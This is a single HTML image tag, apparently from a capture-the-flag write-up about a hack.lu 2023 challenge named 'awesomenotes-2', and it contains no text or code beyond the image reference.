<img src="/assets/images/ctf/2023/hack.lu/awesomenotes-2/4.PNG" width="700px">   
